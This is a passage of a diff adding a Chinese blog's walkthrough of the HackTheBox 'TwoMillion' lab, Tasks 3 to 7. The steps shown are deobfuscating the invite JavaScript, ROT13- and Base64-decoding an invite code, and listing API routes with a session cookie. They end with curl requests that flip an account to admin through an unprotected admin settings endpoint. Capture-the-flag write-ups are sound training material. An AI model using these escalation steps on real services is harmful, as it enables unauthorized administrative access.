class="p">(</span><span class="nx">response</span><span class="p">)}})}</span><span class="kd">function</span> <span class="nx">makeInviteCode</span><span class="p">(){</span><span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span><span class="nx">type</span><span class="o">:</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span><span class="nx">dataType</span><span class="o">:</span><span class="s2">&#34;json&#34;</span><span class="p">,</span><span class="nx">url</span><span class="o">:</span><span class="s1">&#39;/api/v1/invite/how/to/generate&#39;</span><span class="p">,</span><span class="nx">success</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">){</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">)},</span><span class="nx">error</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">){</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">)}})}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后再丢进 <a class="link" href="https://beautifier.io/"  target="_blank" rel="noopener"
+    >https://beautifier.io/</a> 美化一下代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">verifyInviteCode</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">formData</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;code&#34;</span><span class="o">:</span> <span class="nx">code</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">type</span><span class="o">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">dataType</span><span class="o">:</span> <span class="s2">&#34;json&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">data</span><span class="o">:</span> <span class="nx">formData</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">url</span><span class="o">:</span> <span class="s1">&#39;/api/v1/invite/verify&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">success</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">error</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">makeInviteCode</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">type</span><span class="o">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">dataType</span><span class="o">:</span> <span class="s2">&#34;json&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">url</span><span class="o">:</span> <span class="s1">&#39;/api/v1/invite/how/to/generate&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">success</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">error</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可见有两个函数 <code>verifyInviteCode</code> 和 <code>makeInviteCode</code>。顾名思义，前者验证邀请码，后者生成邀请码。</p>
+<p>控制台运行 <code>makeInviteCode()</code>，得到函数返回：</p>
+<p><img src="/p/15.-twomillion/assets/image-20261109114110145.png"
+	width="2019"
+	height="364"
+	srcset="/p/15.-twomillion/assets/image-20261109114110145_hu15416350722457023342.png 480w, /p/15.-twomillion/assets/image-20261109114110145_hu6932787343283531646.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261109114110145"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="554"
+		data-flex-basis="1331px"
+	
+></p>
+<p>提示说：<em>数据是加密的，我们需要检查加密方式以求解密它。</em></p>
+<p><strong>答案：makeInviteCode</strong></p>
+<h3 id="task-4">Task 4
+</h3><blockquote>
+<p>The endpoint in <code>makeInviteCode</code> returns encrypted data. That message provides another endpoint to query. That endpoint returns a <code>code</code> value that is encoded with what very common binary to text encoding format. What is the name of that encoding?</p>
+<p>makeInviteCode 端点返回加密数据。该消息提供了另一个可供查询的端点。该端点返回一个代码值，该代码值采用一种非常常见的二进制到文本编码格式进行编码。这种编码格式的名称是什么？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">data:</span> <span class="s2">&#34;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">enctype:</span> <span class="s2">&#34;ROT13&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>加密方式是 ROT13 凯撒移位（偏移 13 位），字母循环移位 13 位。</p>
+<p>因为字母表总共只有 26 位，所以说 ROT 13 是自逆的，也就是说加密一次=解密一次。</p>
+<p>做 ROT 13 解密的工具有很多，这里使用 hURL：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# apt install hurl --fix-missing
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# hURL --help
+</span></span><span class="line"><span class="cl">-8<span class="p">|</span>--rot13   <span class="o">=</span>&gt; ROT13 decode                  <span class="p">;</span>  /usr/bin/hURL -8 <span class="s2">&#34;uryyb jbeyq&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# hURL -8 <span class="s2">&#34;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Original string   :: Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr
+</span></span><span class="line"><span class="cl">ROT13 decoded     :: In order to generate the invite code, make a POST request to /api/v1/invite/generate
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解密结果：In order to generate the invite code, make a POST request to /api/v1/invite/generate。</p>
+<p>所以发一条 POST 请求：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -X POST http://2million.htb/api/v1/invite/generate
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;0&#34;</span>:200,<span class="s2">&#34;success&#34;</span>:1,<span class="s2">&#34;data&#34;</span>:<span class="o">{</span><span class="s2">&#34;code&#34;</span>:<span class="s2">&#34;OUJTRjQtRjNZR00tUEE5MkEtRk5FNTY=&#34;</span>,<span class="s2">&#34;format&#34;</span>:<span class="s2">&#34;encoded&#34;</span><span class="o">}}</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>回显的 code 是 Base64 加密的，解密一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# hURL -b <span class="s2">&#34;OUJTRjQtRjNZR00tUEE5MkEtRk5FNTY=&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Original string       :: <span class="nv">OUJTRjQtRjNZR00tUEE5MkEtRk5FNTY</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl">base64 DEcoded string :: 9BSF4-F3YGM-PA92A-FNE56
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/15.-twomillion/assets/image-20261109115321980.png"
+	width="792"
+	height="225"
+	srcset="/p/15.-twomillion/assets/image-20261109115321980_hu7734612326401257058.png 480w, /p/15.-twomillion/assets/image-20261109115321980_hu1699127178370613826.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261109115321980"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="352"
+		data-flex-basis="844px"
+	
+></p>
+<p><strong>答案：base64</strong></p>
+<h3 id="task-5">Task 5
+</h3><blockquote>
+<p>What is the path to the endpoint the page uses when a user clicks on &ldquo;Connection Pack&rdquo;?</p>
+<p>当用户点击“连接包”时，页面使用的端点路径是什么？</p>
+</blockquote>
+<p>输入邀请码，然后注册了一个账户 <a class="link" href="mailto:admin@qq.com" >admin@qq.com</a>:admin。</p>
+<p>在 Access -&gt; Connection Pack</p>
+<p><img src="/p/15.-twomillion/assets/image-20261109115936617.png"
+	width="2167"
+	height="284"
+	srcset="/p/15.-twomillion/assets/image-20261109115936617_hu12755905226651294261.png 480w, /p/15.-twomillion/assets/image-20261109115936617_hu9492742373603682561.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261109115936617"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="763"
+		data-flex-basis="1831px"
+	
+></p>
+<p><strong>答案：/api/v1/user/vpn/generate</strong></p>
+<h3 id="task-6">Task 6
+</h3><blockquote>
+<p>How many API endpoints are there under <code>/api/v1/admin</code>?</p>
+<p>/api/v1/admin 下有多少个 API 端点？</p>
+</blockquote>
+<p>使用 curl 对 /api/v1 发起请求，使用 jq 美化 json。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -X GET http://2million.htb/api/v1 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;Cookie: PHPSESSID=o4ug9oiv9n0l72vpsio4sa3qiu&#34;</span> <span class="p">|</span> jq .
+</span></span><span class="line"><span class="cl">  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+</span></span><span class="line"><span class="cl">                                 Dload  Upload  Total   Spent   Left   Speed
+</span></span><span class="line"><span class="cl"><span class="m">100</span>    <span class="m">800</span>   <span class="m">0</span>    <span class="m">800</span>   <span class="m">0</span>      <span class="m">0</span>   <span class="m">2822</span>      <span class="m">0</span>                              <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;v1&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;user&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;GET&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1&#34;</span>: <span class="s2">&#34;Route List&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/invite/how/to/generate&#34;</span>: <span class="s2">&#34;Instructions on invite code generation&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/invite/generate&#34;</span>: <span class="s2">&#34;Generate invite code&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/invite/verify&#34;</span>: <span class="s2">&#34;Verify invite code&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/user/auth&#34;</span>: <span class="s2">&#34;Check if user is authenticated&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/user/vpn/generate&#34;</span>: <span class="s2">&#34;Generate a new VPN configuration&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/user/vpn/regenerate&#34;</span>: <span class="s2">&#34;Regenerate VPN configuration&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/user/vpn/download&#34;</span>: <span class="s2">&#34;Download OVPN file&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;POST&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/user/register&#34;</span>: <span class="s2">&#34;Register a new user&#34;</span>,
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/user/login&#34;</span>: <span class="s2">&#34;Login with existing user&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;admin&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;GET&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/admin/auth&#34;</span>: <span class="s2">&#34;Check if user is admin&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;POST&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/admin/vpn/generate&#34;</span>: <span class="s2">&#34;Generate VPN for specific user&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;PUT&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;/api/v1/admin/settings/update&#34;</span>: <span class="s2">&#34;Update user settings&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>admin 有三个接口。</p>
+<p><strong>答案：3</strong></p>
+<h3 id="task-7">Task 7
+</h3><blockquote>
+<p>What API endpoint can change a user account to an admin account?</p>
+<p>哪个API接口可以将用户帐户更改为管理员帐户？</p>
+</blockquote>
+<p>就是一步步试吧：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -i -X PUT http://2million.htb/api/v1/admin/settings/update <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;Cookie: PHPSESSID=o4ug9oiv9n0l72vpsio4sa3qiu&#34;</span>
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Server: nginx
+</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">09</span> Nov <span class="m">2026</span> 04:07:54 GMT
+</span></span><span class="line"><span class="cl">Content-Type: application/json
+</span></span><span class="line"><span class="cl">Transfer-Encoding: chunked
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">Expires: Thu, <span class="m">19</span> Nov <span class="m">1981</span> 08:52:00 GMT
+</span></span><span class="line"><span class="cl">Cache-Control: no-store, no-cache, must-revalidate
+</span></span><span class="line"><span class="cl">Pragma: no-cache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;danger&#34;</span>,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;Invalid content type.&#34;</span><span class="o">}</span>                                                                                             
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -i -X PUT http://2million.htb/api/v1/admin/settings/update <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;Cookie: PHPSESSID=o4ug9oiv9n0l72vpsio4sa3qiu&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>&gt; -H <span class="s2">&#34;Content-Type: application/json&#34;</span>
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Server: nginx
+</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">09</span> Nov <span class="m">2026</span> 04:08:43 GMT
+</span></span><span class="line"><span class="cl">Content-Type: application/json
+</span></span><span class="line"><span class="cl">Transfer-Encoding: chunked
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">Expires: Thu, <span class="m">19</span> Nov <span class="m">1981</span> 08:52:00 GMT
+</span></span><span class="line"><span class="cl">Cache-Control: no-store, no-cache, must-revalidate
+</span></span><span class="line"><span class="cl">Pragma: no-cache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;danger&#34;</span>,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;Missing parameter: email&#34;</span><span class="o">}</span>                                                                                                                                                                                         
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -i -X PUT http://2million.htb/api/v1/admin/settings/update <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;Cookie: PHPSESSID=o4ug9oiv9n0l72vpsio4sa3qiu&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-d <span class="s1">&#39;{&#34;email&#34;: &#34;admin&#34;}&#39;</span>
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Server: nginx
+</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">09</span> Nov <span class="m">2026</span> 04:09:30 GMT
+</span></span><span class="line"><span class="cl">Content-Type: application/json
+</span></span><span class="line"><span class="cl">Transfer-Encoding: chunked
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">Expires: Thu, <span class="m">19</span> Nov <span class="m">1981</span> 08:52:00 GMT
+</span></span><span class="line"><span class="cl">Cache-Control: no-store, no-cache, must-revalidate
+</span></span><span class="line"><span class="cl">Pragma: no-cache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;danger&#34;</span>,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;Missing parameter: is_admin&#34;</span><span class="o">}</span>                                                                                             
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -i -X PUT http://2million.htb/api/v1/admin/settings/update <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;Cookie: PHPSESSID=o4ug9oiv9n0l72vpsio4sa3qiu&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-d <span class="s1">&#39;{&#34;email&#34;: &#34;admin@qq.com&#34;, &#34;is_admin&#34;: true}&#39;</span>
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Server: nginx
+</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">09</span> Nov <span class="m">2026</span> 04:09:52 GMT
+</span></span><span class="line"><span class="cl">Content-Type: application/json
+</span></span><span class="line"><span class="cl">Transfer-Encoding: chunked
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">Expires: Thu, <span class="m">19</span> Nov <span class="m">1981</span> 08:52:00 GMT
+</span></span><span class="line"><span class="cl">Cache-Control: no-store, no-cache, must-revalidate
+</span></span><span class="line"><span class="cl">Pragma: no-cache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;danger&#34;</span>,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;Variable is_admin needs to be either 0 or 1.&#34;</span><span class="o">}</span>                                                                                             
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/TwoMillion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -i -X PUT http://2million.htb/api/v1/admin/settings/update <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;Cookie: PHPSESSID=o4ug9oiv9n0l72vpsio4sa3qiu&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-d <span class="s1">&#39;{&#34;email&#34;: &#34;admin@qq.com&#34;, &#34;is_admin&#34;: 1}&#39;</span>   
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Server: nginx
+</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">09</span> Nov <span class="m">2026</span> 04:09:57 GMT
+</span></span><span class="line"><span class="cl">Content-Type: application/json
+</span></span><span class="line"><span class="cl">Transfer-Encoding: chunked
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">Expires: Thu, <span class="m">19</span> Nov <span class="m">1981</span> 08:52:00 GMT
